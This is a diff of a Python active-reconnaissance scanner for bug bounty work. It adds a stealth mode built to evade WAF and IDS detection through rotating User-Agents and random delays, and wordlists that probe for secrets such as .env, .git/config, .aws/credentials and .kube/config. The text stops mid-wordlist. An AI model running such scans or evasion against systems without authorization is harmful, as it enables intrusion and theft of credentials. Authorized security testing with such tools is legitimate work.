@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-Active Reconnaissance Tool v1.0
-For authorized bug bounty testing only.
+Active Reconnaissance Tool v2.0 - Advanced Bug Bounty Edition
 Author: Sebastian Rivera
+Solo para targets autorizados.
 """
 
 import sys
@@ -15,11 +15,14 @@ import time
 import argparse
 import threading
 import hashlib
+import base64
+import random
+import struct
 from urllib.parse import urlparse, urljoin, urlencode, parse_qs, quote, unquote
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from html.parser import HTMLParser
-from collections import deque
+from collections import deque, defaultdict
 
 try:
     import requests
@@ -42,149 +45,203 @@ except ImportError:
 #  COLORES
 # =====================================================================
 class C:
-    R = "\033[91m"
-    G = "\033[92m"
-    Y = "\033[93m"
-    B = "\033[94m"
-    M = "\033[95m"
-    C = "\033[96m"
-    W = "\033[97m"
-    D = "\033[90m"
-    BOLD = "\033[1m"
-    X = "\033[0m"
+    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
+    M = "\033[95m"; CY = "\033[96m"; W = "\033[97m"; D = "\033[90m"
+    BOLD = "\033[1m"; X = "\033[0m"
 
 NO_COLOR = False
 
+def _c(code, text):
+    return text if NO_COLOR else f"{code}{text}{C.X}"
+
 def log_info(msg):
-    if NO_COLOR:
-        print(f"  [*] {msg}")
-    else:
-        print(f"  {C.B}[*]{C.X} {msg}")
+    print(f"  {_c(C.B, '[*]')} {msg}")
 
 def log_ok(msg):
-    if NO_COLOR:
-        print(f"  [+] {msg}")
-    else:
-        print(f"  {C.G}[+]{C.X} {msg}")
+    print(f"  {_c(C.G, '[+]')} {msg}")
 
 def log_warn(msg):
-    if NO_COLOR:
-        print(f"  [!] {msg}")
-    else:
-        print(f"  {C.Y}[!]{C.X} {msg}")
+    print(f"  {_c(C.Y, '[!]')} {msg}")
 
 def log_fail(msg):
-    if NO_COLOR:
-        print(f"  [-] {msg}")
-    else:
-        print(f"  {C.R}[-]{C.X} {msg}")
+    print(f"  {_c(C.R, '[-]')} {msg}")
 
 def log_vuln(severity, msg):
     colors = {"CRITICAL": C.R+C.BOLD, "HIGH": C.R, "MEDIUM": C.Y, "LOW": C.B, "INFO": C.D}
     color = colors.get(severity, C.W)
-    if NO_COLOR:
-        print(f"  [{severity}] {msg}")
-    else:
-        print(f"  {color}[{severity}]{C.X} {msg}")
+    tag = _c(color, f"[{severity}]")
+    print(f"  {tag} {msg}")
 
 def banner():
-    b = f"""
-{C.R}{C.BOLD}    ╔══════════════════════════════════════════╗
-    ║     ACTIVE RECON TOOL v1.0               ║
-    ║     Bug Bounty Edition                   ║
-    ╚══════════════════════════════════════════╝{C.X}
-"""
-    if NO_COLOR:
-        b = """
-    ╔══════════════════════════════════════════╗
-    ║     ACTIVE RECON TOOL v1.0               ║
-    ║     Bug Bounty Edition                   ║
-    ╚══════════════════════════════════════════╝
-"""
-    print(b)
+    print(_c(C.R+C.BOLD, """
+    ╔══════════════════════════════════════════════╗
+    ║     ACTIVE RECON TOOL v2.0                   ║
+    ║     Advanced Bug Bounty Edition               ║
+    ╚══════════════════════════════════════════════╝"""))
 
 
 # =====================================================================
 #  DISCLAIMER LEGAL
 # =====================================================================
 def show_disclaimer():
-    """Muestra advertencia legal antes de ejecutar."""
-    disclaimer = f"""
-{C.R}{C.BOLD}╔══════════════════════════════════════════════════════════════╗
-║                    ADVERTENCIA LEGAL                         ║
-╠══════════════════════════════════════════════════════════════╣
-║                                                              ║
-║  Esta herramienta realiza reconocimiento ACTIVO.              ║
-║  Envia paquetes, solicitudes y payloads al objetivo.         ║
-║                                                              ║
-║  SOLO debe usarse contra targets para los cuales             ║
-║  tienes AUTORIZACION EXPLICITA Y POR ESCRITO.                ║
-║                                                              ║
-║  Esto incluye:                                               ║
-║    - Programas de bug bounty donde el target esta en scope   ║
-║    - Servidores y aplicaciones propias                        ║
-║    - Entornos de laboratorio / CTF                           ║
-║    - Pentests con contrato firmado                            ║
-║                                                              ║
-║  El uso no autorizado es ILEGAL y puede resultar en          ║
-║  consecuencias legales graves.                               ║
-║                                                              ║
-║  El autor no se hace responsable del mal uso de esta         ║
-║  herramienta. USALA BAJO TU PROPIA RESPONSABILIDAD.          ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝{C.X}
+    d = f"""
+{_c(C.R+C.BOLD, '╔═══════════════════════════════════════════════════════════════════════╗')}
+{_c(C.R+C.BOLD, '║                      ADVERTENCIA LEGAL                                ║')}
+{_c(C.R+C.BOLD, '╠═══════════════════════════════════════════════════════════════════════╣')}
+{_c(C.R+C.BOLD, '║                                                                       ║')}
+{_c(C.R+C.BOLD, '║  Esta herramienta realiza reconocimiento ACTIVO contra sistemas.       ║')}
+{_c(C.R+C.BOLD, '║  Envia paquetes, solicitudes HTTP, payloads de prueba y escanea        ║')}
+{_c(C.R+C.BOLD, '║  puertos y servicios del objetivo. ESTO ES INTRUSIVO.                  ║')}
+{_c(C.R+C.BOLD, '║                                                                       ║')}
+{_c(C.Y, '║  SOLO debe usarse contra targets para los cuales tienes              ║')}
+{_c(C.Y, '║  AUTORIZACION EXPLICITA Y POR ESCRITO, incluyendo:                   ║')}
+{_c(C.Y, '║                                                                       ║')}
+{_c(C.Y, '║    - Programas de bug bounty con el target en scope                   ║')}
+{_c(C.Y, '║    - Servidores y aplicaciones propias                                ║')}
+{_c(C.Y, '║    - Entornos de laboratorio / CTF                                    ║')}
+{_c(C.Y, '║    - Pentests con contrato firmado                                    ║')}
+{_c(C.R+C.BOLD, '║                                                                       ║')}
+{_c(C.R+C.BOLD, '║  CONSECUENCIAS DEL USO NO AUTORIZADO:                                 ║')}
+{_c(C.R+C.BOLD, '║                                                                       ║')}
+{_c(C.R, '║    - Cargos criminales por acceso no autorizado a sistemas            ║')}
+{_c(C.R, '║      informaticos (leyes de cibercrimen nacionales e internacionales) ║')}
+{_c(C.R, '║    - Penas de prision de 1 a 10 anios segun jurisdiccion             ║')}
+{_c(C.R, '║    - Multas economicas severas                                        ║')}
+{_c(C.R, '║    - Responsabilidad civil por danios y perjuicios                    ║')}
+{_c(C.R, '║    - Prohibicion permanente de plataformas de bug bounty              ║')}
+{_c(C.R, '║    - Antecedentes penales que afectan empleo futuro                   ║')}
+{_c(C.R+C.BOLD, '║                                                                       ║')}
+{_c(C.R+C.BOLD, '║  El autor NO se hace responsable del uso indebido.                     ║')}
+{_c(C.R+C.BOLD, '║  USALA BAJO TU PROPIA RESPONSABILIDAD.                                ║')}
+{_c(C.R+C.BOLD, '║                                                                       ║')}
+{_c(C.R+C.BOLD, '╚═══════════════════════════════════════════════════════════════════════╝')}
 """
-    if NO_COLOR:
-        disclaimer = disclaimer.replace(C.R+C.BOLD, "").replace(C.X, "")
-    print(disclaimer)
-
+    print(d)
     try:
-        resp = input(f"  {C.Y}[?]{C.X} Tienes autorizacion para escanear este target? (s/n): ").strip().lower()
+        resp = input(f"  {_c(C.Y, '[?]')} Tienes autorizacion legal para escanear este target? (s/n): ").strip().lower()
     except (KeyboardInterrupt, EOFError):
         print()
         sys.exit(0)
-
     if resp not in ("s", "si", "y", "yes"):
-        print(f"\n  {C.R}[!] Operacion cancelada. No se realizaron escaneos.{C.X}")
+        print(f"\n  {_c(C.R, '[!] Operacion cancelada. No se realizaron escaneos.')}")
         sys.exit(0)
     print()
 
 
 # =====================================================================
-#  RATE LIMITER
+#  SPEED MODES
+# =====================================================================
+SPEED_MODES = {
+    "slow": {
+        "name": "SLOW (Stealth)",
+        "desc": "Casi indetectable. Delays largos, User-Agents rotativos, orden aleatorio.",
+        "rate_limit": 1, "delay_min": 2.0, "delay_max": 5.0,
+        "threads": 2, "rotate_ua": True, "jitter": True, "randomize": True,
+    },
+    "medium": {
+        "name": "MEDIUM (Balanced)",
+        "desc": "Balance entre velocidad y sigilo. Moderadamente detectable.",
+        "rate_limit": 8, "delay_min": 0.3, "delay_max": 1.0,
+        "threads": 5, "rotate_ua": True, "jitter": True, "randomize": True,
+    },
+    "high": {
+        "name": "HIGH (Aggressive)",
+        "desc": "Velocidad maxima. Facilmente detectable por WAF/IDS.",
+        "rate_limit": 0, "delay_min": 0, "delay_max": 0.05,
+        "threads": 15, "rotate_ua": False, "jitter": False, "randomize": False,
+    },
+}
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+]
+
+def select_mode_interactive():
+    print(_c(C.CY+C.BOLD, """
+    ╔══════════════════════════════════════════════════╗
+    ║          SELECCIONA EL MODO DE ESCANEO           ║
+    ╠══════════════════════════════════════════════════╣
+    ║                                                  ║
+    ║  [1] SLOW   - Sigiloso, casi indetectable        ║
+    ║              Delay 2-5s entre requests            ║
+    ║              User-Agents rotativos                ║
+    ║              Orden aleatorio de pruebas           ║
+    ║                                                  ║
+    ║  [2] MEDIUM - Balance velocidad/sigilo            ║
+    ║              Delay 0.3-1s entre requests          ║
+    ║              Moderadamente detectable             ║
+    ║                                                  ║
+    ║  [3] HIGH   - Agresivo, maxima velocidad          ║
+    ║              Sin delays, 15 hilos paralelos       ║
+    ║              Facilmente detectable                ║
+    ║                                                  ║
+    ╚══════════════════════════════════════════════════╝"""))
+    while True:
+        try:
+            choice = input(f"\n  {_c(C.Y, '[?]')} Modo (1/2/3): ").strip()
+        except (KeyboardInterrupt, EOFError):
+            print()
+            sys.exit(0)
+        if choice == "1":
+            return "slow"
+        elif choice == "2":
+            return "medium"
+        elif choice == "3":
+            return "high"
+        else:
+            print(f"  {_c(C.R, '[!]')} Opcion invalida. Ingresa 1, 2 o 3.")
+
+
+# =====================================================================
+#  RATE LIMITER (SPEED-AWARE)
 # =====================================================================
 class RateLimiter:
-    """Controla la velocidad de requests."""
-    def __init__(self, max_rps=0):
-        self.max_rps = max_rps
+    def __init__(self, mode_config):
+        self.config = mode_config
+        self.max_rps = mode_config["rate_limit"]
         self.last_request = 0
         self.lock = threading.Lock()
         self.request_count = 0
 
     def wait(self):
-        if self.max_rps <= 0:
-            with self.lock:
-                self.request_count += 1
-            return
         with self.lock:
-            now = time.time()
-            min_interval = 1.0 / self.max_rps
-            elapsed = now - self.last_request
-            if elapsed < min_interval:
-                time.sleep(min_interval - elapsed)
-            self.last_request = time.time()
             self.request_count += 1
+            now = time.time()
+            # Base rate limiting
+            if self.max_rps > 0:
+                min_interval = 1.0 / self.max_rps
+                elapsed = now - self.last_request
+                if elapsed < min_interval:
+                    time.sleep(min_interval - elapsed)
+            # Additional jitter delay for stealth
+            if self.config["jitter"]:
+                delay = random.uniform(self.config["delay_min"], self.config["delay_max"])
+                time.sleep(delay)
+            elif self.config["delay_max"] > 0:
+                time.sleep(self.config["delay_min"])
+            self.last_request = time.time()
 
 
 # =====================================================================
-#  UTILIDADES
+#  HTTP SESSION & UTILITIES
 # =====================================================================
-def create_session(user_agent=None, proxy=None, cookies=None, headers=None, timeout=10):
-    """Crea session HTTP configurada."""
+def create_session(user_agent=None, proxy=None, cookies=None, headers=None, timeout=10, rotate_ua=False):
     s = requests.Session()
     s.verify = False
     s.timeout = timeout
-    s.headers["User-Agent"] = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    if rotate_ua:
+        s.headers["User-Agent"] = random.choice(USER_AGENTS)
+    else:
+        s.headers["User-Agent"] = user_agent or USER_AGENTS[0]
     if proxy:
         s.proxies = {"http": proxy, "https": proxy}
     if cookies:
@@ -199,31 +256,24 @@ def create_session(user_agent=None, proxy=None, cookies=None, headers=None, time
                 s.headers[k.strip()] = v.strip()
     return s
 
-def safe_request(session, method, url, rate_limiter=None, **kwargs):
-    """Request con error handling y rate limiting."""
+def safe_request(session, method, url, rate_limiter=None, rotate_ua=False, **kwargs):
     if rate_limiter:
         rate_limiter.wait()
+    if rotate_ua:
+        session.headers["User-Agent"] = random.choice(USER_AGENTS)
     try:
         kwargs.setdefault("timeout", 10)
         kwargs.setdefault("verify", False)
         kwargs.setdefault("allow_redirects", False)
-        resp = session.request(method, url, **kwargs)
-        return resp
-    except requests.exceptions.ConnectionError:
-        return None
-    except requests.exceptions.Timeout:
-        return None
-    except requests.exceptions.TooManyRedirects:
-        return None
-    except Exception:
+        return session.request(method, url, **kwargs)
+    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
+            requests.exceptions.TooManyRedirects, Exception):
         return None
 
 def get_domain(url):
-    """Extrae dominio de URL."""
     return urlparse(url).hostname or ""
 
 def get_base_url(url):
-    """Normaliza base URL."""
     p = urlparse(url)
     scheme = p.scheme or "https"
     host = p.hostname or ""
@@ -233,239 +283,423 @@ def get_base_url(url):
     return f"{scheme}://{host}"
 
 def resolve_host(hostname):
-    """Resuelve hostname a IP."""
     try:
         return socket.gethostbyname(hostname)
     except socket.gaierror:
         return None
 
 def section_header(title):
-    """Imprime header de seccion."""
+    sep = "=" * 60
     if NO_COLOR:
-        print(f"\n{'='*60}")
-        print(f"  {title}")
-        print(f"{'='*60}")
+        print(f"\n{sep}\n  {title}\n{sep}")
     else:
-        print(f"\n{C.C}{'='*60}{C.X}")
-        print(f"  {C.BOLD}{C.C}{title}{C.X}")
-        print(f"{C.C}{'='*60}{C.X}")
+        print(f"\n{C.CY}{sep}{C.X}\n  {C.BOLD}{C.CY}{title}{C.X}\n{C.CY}{sep}{C.X}")
 
 
 # =====================================================================
 #  WORDLISTS INTEGRADAS
 # =====================================================================
 TOP_PORTS = [
-    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445,
-    465, 514, 515, 587, 631, 636, 993, 995, 1080, 1433, 1434, 1521, 1723,
-    2049, 2082, 2083, 2086, 2087, 2096, 2181, 3000, 3001, 3128, 3268, 3306,
-    3389, 3690, 4443, 4848, 5000, 5001, 5432, 5555, 5601, 5672, 5900, 5985,
-    5986, 6000, 6379, 6443, 6666, 7001, 7002, 7070, 7443, 8000, 8001, 8008,
-    8009, 8010, 8020, 8042, 8060, 8069, 8080, 8081, 8082, 8083, 8084, 8085,
-    8086, 8088, 8090, 8091, 8181, 8443, 8444, 8800, 8880, 8888, 8983, 9000,
-    9001, 9042, 9043, 9060, 9080, 9090, 9091, 9200, 9300, 9443, 9999, 10000,
-    11211, 15672, 27017, 27018, 28017, 50000, 50070
+    21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,465,514,515,
+    587,631,636,993,995,1080,1433,1434,1521,1723,2049,2082,2083,2086,
+    2087,2096,2181,3000,3001,3128,3268,3306,3389,3690,4443,4848,5000,
+    5001,5432,5555,5601,5672,5900,5985,5986,6000,6379,6443,6666,7001,
+    7002,7070,7443,8000,8001,8008,8009,8010,8020,8042,8060,8069,8080,
+    8081,8082,8083,8084,8085,8086,8088,8090,8091,8181,8443,8444,8800,
+    8880,8888,8983,9000,9001,9042,9043,9060,9080,9090,9091,9200,9300,
+    9443,9999,10000,11211,15672,27017,27018,28017,50000,50070,
 ]
 
 DIR_WORDLIST = [
-    "admin", "administrator", "admin.php", "admin.html", "admin/login",
-    "login", "login.php", "signin", "auth", "authenticate",
-    "wp-admin", "wp-login.php", "wp-content", "wp-includes", "wp-json",
-    "api", "api/v1", "api/v2", "api/v3", "api/docs", "api/swagger",
-    "swagger", "swagger-ui", "swagger.json", "swagger.yaml",
-    "graphql", "graphiql", "graphql/console",
-    "console", "dashboard", "panel", "portal", "manager",
-    "config", "config.php", "config.yml", "config.json", "config.xml",
-    "configuration", "settings", "setup", "install", "installer",
-    ".env", ".env.bak", ".env.local", ".env.production", ".env.development",
-    ".git", ".git/config", ".git/HEAD", ".gitignore",
-    ".svn", ".svn/entries", ".hg",
-    ".htaccess", ".htpasswd", "web.config", "nginx.conf",
-    "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
-    "security.txt", ".well-known/security.txt",
-    "backup", "backup.sql", "backup.zip", "backup.tar.gz", "backup.bak",
-    "db", "database", "database.sql", "dump", "dump.sql",
-    "test", "testing", "test.php", "test.html", "debug",
-    "debug.php", "info.php", "phpinfo.php", "info", "server-info",
-    "server-status", "status", "health", "healthcheck",
-    "uploads", "upload", "files", "media", "images", "assets", "static",
-    "tmp", "temp", "cache", "log", "logs", "error.log", "access.log",
-    "private", "secret", "internal", "restricted", "confidential",
-    "cgi-bin", "cgi", "scripts", "bin",
-    "phpmyadmin", "pma", "phpMyAdmin", "myadmin",
-    "adminer", "adminer.php",
-    "webmail", "mail", "email", "roundcube",
-    "cpanel", "whm", "plesk",
-    "jenkins", "hudson", "bamboo", "travis",
-    "jira", "confluence", "bitbucket",
-    "gitlab", "git", "redmine", "bugzilla",
-    "nagios", "zabbix", "grafana", "prometheus", "kibana",
-    "solr", "elasticsearch", "sphinx",
-    "tomcat", "manager/html", "host-manager",
-    "jmx-console", "web-console", "invoker",
-    "actuator", "actuator/health", "actuator/env", "actuator/beans",
-    "actuator/mappings", "actuator/configprops", "actuator/trace",
-    "metrics", "monitoring",
-    "node_modules", "package.json", "package-lock.json", "yarn.lock",
-    "composer.json", "composer.lock", "Gemfile", "Gemfile.lock",
-    "requirements.txt", "Pipfile", "Pipfile.lock",
-    "Dockerfile", "docker-compose.yml", ".dockerignore",
-    "Makefile", "Rakefile", "Gruntfile.js", "gulpfile.js", "webpack.config.js",
-    "readme", "README.md", "README.txt", "CHANGELOG", "CHANGELOG.md",
-    "LICENSE", "CONTRIBUTING.md",
-    "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
-    "xmlrpc.php", "wp-cron.php",
-    "user", "users", "accounts", "account", "profile", "profiles",
-    "register", "signup", "registration",
-    "password", "forgot", "reset", "recover",
-    "logout", "signout", "exit",
-    "search", "find", "query",
-    "download", "downloads", "export",
-    "reports", "report", "analytics",
-    "docs", "documentation", "doc", "help", "faq", "support",
-    "about", "contact", "terms", "privacy", "policy",
-    "old", "legacy", "archive", "archived",
-    "dev", "development", "staging", "stage", "beta", "alpha",
-    "sandbox", "demo", "preview",
-    "v1", "v2", "version", "latest",
-    "proxy", "gateway", "redirect",
-    "socket.io", "sockjs", "ws", "websocket",
-    "feed", "rss", "atom",
-    "oauth", "oauth2", "sso", "saml", "callback",
-    "token", "tokens", "session", "sessions",
-    "cron", "jobs", "queue", "worker", "workers",
-    ".DS_Store", "Thumbs.db", "desktop.ini",
-    "error", "404", "500", "403",
-    "trace.axd", "elmah.axd",
-    "server", "services", "service",
-    "include", "includes", "inc",
-    "lib", "libs", "library",
-    "src", "source", "app",
-    "vendor", "third-party", "external",
-    "data", "db.sqlite", "db.sqlite3",
-    "wp-json/wp/v2/users",
-    ".well-known/openid-configuration",
-    "realms", "auth/realms",
+    "admin","administrator","admin.php","admin.html","admin/login",
+    "login","login.php","signin","auth","authenticate",
+    "wp-admin","wp-login.php","wp-content","wp-includes","wp-json",
+    "api","api/v1","api/v2","api/v3","api/docs","api/swagger",
+    "swagger","swagger-ui","swagger.json","swagger.yaml","openapi.json",
+    "graphql","graphiql","graphql/console","altair",
+    "console","dashboard","panel","portal","manager",
+    "config","config.php","config.yml","config.json","config.xml",
+    "configuration","settings","setup","install","installer",
+    ".env",".env.bak",".env.local",".env.production",".env.development",
+    ".env.staging",".env.old",".env.save",".env.swp",".env.example",
+    ".git",".git/config",".git/HEAD",".git/logs/HEAD",".gitignore",
+    ".svn",".svn/entries",".svn/wc.db",".hg",".hg/store",
+    ".htaccess",".htpasswd","web.config","nginx.conf","httpd.conf",
+    "robots.txt","sitemap.xml","crossdomain.xml","clientaccesspolicy.xml",
+    "security.txt",".well-known/security.txt",".well-known/openid-configuration",
+    "backup","backup.sql","backup.zip","backup.tar.gz","backup.bak","backup.rar",
+    "db","database","database.sql","dump","dump.sql","db.sql","data.sql",
+    "test","testing","test.php","test.html","debug","debug.php",
+    "info.php","phpinfo.php","info","server-info","server-status",
+    "status","health","healthcheck","health.json","ready","alive",
+    "uploads","upload","files","media","images","assets","static",
+    "tmp","temp","cache","log","logs","error.log","access.log","debug.log",
+    "private","secret","internal","restricted","confidential",
+    "cgi-bin","cgi","scripts","bin",
+    "phpmyadmin","pma","phpMyAdmin","myadmin","adminer","adminer.php",
+    "webmail","mail","email","roundcube",
+    "cpanel","whm","plesk",
+    "jenkins","hudson","bamboo","travis","circleci",
+    "jira","confluence","bitbucket","gitlab","git","redmine","bugzilla",
+    "nagios","zabbix","grafana","prometheus","kibana","datadog",
+    "solr","elasticsearch","sphinx",
+    "tomcat","manager/html","host-manager","jmx-console","web-console","invoker",
+    "actuator","actuator/health","actuator/env","actuator/beans","actuator/info",
+    "actuator/mappings","actuator/configprops","actuator/trace","actuator/heapdump",
+    "actuator/threaddump","actuator/loggers","actuator/auditevents",
+    "metrics","monitoring","_debug","_profiler",
+    "node_modules","package.json","package-lock.json","yarn.lock",
+    "composer.json","composer.lock","Gemfile","requirements.txt",
+    "Dockerfile","docker-compose.yml",".dockerignore","Procfile",
+    "Makefile","webpack.config.js","tsconfig.json",".babelrc",
+    "README.md","README.txt","CHANGELOG","CHANGELOG.md","LICENSE",
+    "wp-config.php","wp-config.php.bak","wp-config.php.old","wp-config.php~",
+    "xmlrpc.php","wp-cron.php","wp-json/wp/v2/users",
+    "user","users","accounts","account","profile","register","signup",
+    "password","forgot","reset","recover","logout",
+    "search","download","downloads","export","reports","analytics",
+    "docs","documentation","help","faq","support","about","contact",
+    "old","legacy","archive","dev","development","staging","beta","sandbox",
+    "proxy","gateway","redirect","callback","oauth","oauth2","sso","saml",
+    "token","session","cron","jobs","queue","worker",
+    ".DS_Store","Thumbs.db","trace.axd","elmah.axd",
+    "server","services","service","include","includes","lib","src","app","vendor",
+    "data","db.sqlite","db.sqlite3","firebase.json",".firebase",
+    "realms","auth/realms","keycloak",
+    # Archivos de respaldo comunes
+    "index.php.bak","index.php.old","index.php~","index.php.save",
+    "index.html.bak","index.html.old",
+    "web.config.bak","web.config.old",
+    "config.php.bak","config.php.old","config.php~",
+    "application.yml","application.properties","appsettings.json",
+    "appsettings.Development.json",
+    # Archivos de IDE/editor
+    ".idea",".vscode",".vscode/settings.json",".project",".classpath",
+    # AWS/Cloud
+    ".aws/credentials",".aws/config","aws.yml","s3.yml",
+    # Kubernetes
+    ".kube/config","kubernetes.yml","k8s.yml","helm",
+    # CI/CD
+    ".github",".github/workflows",".gitlab-ci.yml","Jenkinsfile",
+    ".circleci/config.yml",".travis.yml",
 ]
 
 SUB_WORDLIST = [
-    "www", "mail", "ftp", "smtp", "pop", "imap", "webmail",
-    "admin", "administrator", "panel", "cpanel", "whm",
-    "ns1", "ns2", "ns3", "dns", "dns1", "dns2",
-    "api", "api2", "apis", "rest", "graphql",
-    "dev", "development", "staging", "stage", "test", "testing",
-    "beta", "alpha", "demo", "sandbox", "preview",
-    "prod", "production", "live",
-    "app", "apps", "application", "mobile", "m",
-    "portal", "gateway", "proxy", "vpn", "remote",
-    "cdn", "static", "assets", "media", "images", "img",
-    "docs", "doc", "documentation", "wiki", "help", "support",
-    "blog", "news", "press", "forum", "community",
-    "shop", "store", "ecommerce", "cart", "checkout",
-    "git", "gitlab", "github", "bitbucket", "svn", "repo",
-    "jenkins", "ci", "cd", "build", "deploy",
-    "jira", "confluence", "redmine", "bugzilla", "issues",
-    "monitor", "monitoring", "grafana", "prometheus", "nagios", "zabbix",
-    "elk", "kibana", "elasticsearch", "logstash",
-    "db", "database", "mysql", "postgres", "mongo", "redis", "memcached",
-    "backup", "bak", "old", "legacy", "archive",
-    "internal", "intranet", "private", "corp", "corporate",
-    "sso", "auth", "login", "id", "identity", "oauth",
-    "email", "mx", "relay", "exchange",
-    "s3", "storage", "files", "upload", "downloads",
-    "status", "health", "uptime",
-    "calendar", "meet", "chat", "slack", "teams",
-    "crm", "erp", "hr", "finance",
-    "analytics", "metrics", "stats", "reports",
-    "web", "www2", "www3", "web1", "web2",
-    "host", "server", "node", "cluster",
-    "edge", "lb", "loadbalancer",
-    "cache", "varnish", "nginx",
-    "queue", "rabbit", "kafka", "mq",
-    "search", "solr", "elastic",
-    "payments", "pay", "billing", "invoice",
-    "secure", "ssl", "tls",
-    "stg", "uat", "qa", "preprod", "pre-prod",
-    "v1", "v2", "api-v1", "api-v2",
+    "www","mail","ftp","smtp","pop","imap","webmail",
+    "admin","administrator","panel","cpanel","whm",
+    "ns1","ns2","ns3","dns","dns1","dns2",
+    "api","api2","apis","rest","graphql",
+    "dev","development","staging","stage","test","testing",
+    "beta","alpha","demo","sandbox","preview",
+    "prod","production","live",
+    "app","apps","application","mobile","m",
+    "portal","gateway","proxy","vpn","remote",
+    "cdn","static","assets","media","images","img",
+    "docs","doc","documentation","wiki","help","support",
+    "blog","news","press","forum","community",
+    "shop","store","ecommerce","cart","checkout",
+    "git","gitlab","github","bitbucket","svn","repo",
+    "jenkins","ci","cd","build","deploy",
+    "jira","confluence","redmine","bugzilla","issues",
+    "monitor","monitoring","grafana","prometheus","nagios","zabbix",
+    "elk","kibana","elasticsearch","logstash",
+    "db","database","mysql","postgres","mongo","redis","memcached",
+    "backup","bak","old","legacy","archive",
+    "internal","intranet","private","corp","corporate",
+    "sso","auth","login","id","identity","oauth",
+    "email","mx","relay","exchange",
+    "s3","storage","files","upload","downloads",
+    "status","health","uptime",
+    "calendar","meet","chat","slack","teams",
+    "crm","erp","hr","finance",
+    "analytics","metrics","stats","reports",
+    "web","www2","www3","web1","web2",
+    "host","server","node","cluster",
+    "edge","lb","loadbalancer",
+    "cache","varnish","nginx",
+    "queue","rabbit","kafka","mq",
+    "search","solr","elastic",
+    "payments","pay","billing","invoice",
+    "secure","ssl","tls",
+    "stg","uat","qa","preprod","pre-prod",
+    "v1","v2","api-v1","api-v2",
 ]
 
 PARAM_WORDLIST = [
-    "id", "page", "file", "path", "dir", "search", "q", "query", "s",
-    "url", "uri", "redirect", "return", "next", "goto", "target", "dest",
-    "rurl", "return_url", "redirect_url", "callback", "continue",
-    "user", "username", "email", "name", "login", "password",
-    "token", "key", "api_key", "apikey", "secret", "session",
-    "cmd", "command", "exec", "run", "action", "do",
-    "cat", "category", "type", "sort", "order", "limit", "offset",
-    "lang", "language", "locale", "country",
-    "template", "theme", "view", "layout", "module", "plugin",
-    "include", "require", "load", "read", "fetch", "get",
-    "format", "output", "export", "download",
-    "debug", "test", "verbose", "mode",
-    "admin", "role", "level", "access", "permission",
-    "filter", "where", "select", "from", "table",
-    "host", "port", "server", "domain", "ip",
-    "config", "setting", "option", "param", "data", "input", "value",
+    "id","page","file","path","dir","search","q","query","s",
+    "url","uri","redirect","return","next","goto","target","dest",
+    "rurl","return_url","redirect_url","callback","continue",
+    "user","username","email","name","login","password",
+    "token","key","api_key","apikey","secret","session",
+    "cmd","command","exec","run","action","do",
+    "cat","category","type","sort","order","limit","offset",
+    "lang","language","locale","country",
+    "template","theme","view","layout","module","plugin",
+    "include","require","load","read","fetch","get",
+    "format","output","export","download",
+    "debug","test","verbose","mode",
+    "admin","role","level","access","permission",
+    "filter","where","select","from","table",
+    "host","port","server","domain","ip",
+    "config","setting","option","param","data","input","value",
+    "ref","source","origin","site","base","root",
+    "body","content","text","message","comment","description",
+    "filename","document","report","log","trace",
 ]
 
 API_WORDLIST = [
-    "api", "api/v1", "api/v2", "api/v3",
-    "api/users", "api/user", "api/me", "api/profile",
-    "api/admin", "api/config", "api/settings",
-    "api/auth", "api/login", "api/register", "api/token",
-    "api/search", "api/query",
-    "api/upload", "api/files", "api/download",
-    "api/health", "api/status", "api/version", "api/info",
-    "api/docs", "api/swagger", "api/openapi",
-    "api/graphql", "api/rest",
-    "api/internal", "api/private", "api/debug",
-    "api/test", "api/dev",
-    "rest/api", "rest/v1", "rest/v2",
-    "v1", "v2", "v3",
-    "api/products", "api/orders", "api/items",
-    "api/comments", "api/posts", "api/pages",
-    "api/notifications", "api/messages",
-    "api/roles", "api/permissions",
-    "api/keys", "api/tokens", "api/sessions",
-    "api/logs", "api/events", "api/audit",
-    "api/export", "api/import", "api/backup",
-    "_api", "__api", "api_v1", "api_v2",
+    "api","api/v1","api/v2","api/v3",
+    "api/users","api/user","api/me","api/profile",
+    "api/admin","api/config","api/settings",
+    "api/auth","api/login","api/register","api/token","api/refresh",
+    "api/search","api/query",
+    "api/upload","api/files","api/download",
+    "api/health","api/status","api/version","api/info",
